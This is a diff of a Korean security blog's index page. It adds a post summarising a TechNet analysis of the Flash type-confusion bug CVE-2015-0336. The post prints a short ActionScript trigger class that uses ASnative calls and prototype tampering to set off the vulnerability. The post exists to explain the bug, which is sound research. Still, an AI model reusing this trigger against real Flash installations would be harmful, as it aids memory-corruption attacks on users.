@@ -9,8 +9,25 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Yuki Chen 이 발표한 The Birth of a Complete IE11 Exploit Under the New Exploit Mitigations 를 읽고 요약해본다.
-">
+  <meta name="description" content="TechNet blogs 에 올라온 글을 정리해본다. Understanding type confusion vulnerabilities: CVE-2015-0336 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+class Trigger
+{ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +83,73 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/20/understanding-type-confusion-vulnerabilities-cve-2015-0336/">Understanding Type Confusion Vulnerabilities: CVE-2015-0336</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-20T14:08:38+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:08 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>TechNet blogs 에 올라온 글을 정리해본다.</p>
+
+<p><a href="http://blogs.technet.com/b/mmpc/archive/2015/06/18/understanding-type-confusion-vulnerabilities-cve-2015-0336.aspx">Understanding type confusion vulnerabilities: CVE-2015-0336</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>class Trigger
+</span><span class='line'>{
+</span><span class='line'>    function Trigger()
+</span><span class='line'>    {
+</span><span class='line'>        var _loc2_ = _global.ASnative(2100,438181888);
+</span><span class='line'>        var _loc3_ = new Object();
+</span><span class='line'>        _loc2_.__proto__ = _loc3_;
+</span><span class='line'>        _global.ASnative(2100,200)(_loc3_);
+</span><span class='line'>        _global.ASnative(2100,8).apply(_loc2_,[1]);
+</span><span class='line'>        var _loc4_ = new LocalConnection();
+</span><span class='line'>        _loc4_.send("toAS3","trig_loaded");
+</span><span class='line'>    }
+</span><span class='line'>    static function main(mc)
+</span><span class='line'>    {
+</span><span class='line'>        Trigger.app = new Trigger();
+</span><span class='line'>    }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -799,35 +883,6 @@ Client 로부터 <code>CONNECT</code> 를 받으면, 진짜 서버에 접속해�
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/07/new-directions-in-cryptography/">New Directions in Cryptography</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-07T10:24:26+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:24 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content">
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/7">&larr; Older</a>
@@ -845,6 +900,10 @@ Client 로부터 <code>CONNECT</code> 를 받으면, 진짜 서버에 접속해�
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/13/control-flow-enforcement-technology-preview/">Control-flow Enforcement Technology Preview</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
       </li>
     
@@ -858,10 +917,6 @@ Client 로부터 <code>CONNECT</code> 를 받으면, 진짜 서버에 접속해�
     
       <li class="post">
         <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/03/03/the-drown-attack/">The DROWN Attack</a>
       </li>
     
   </ul>
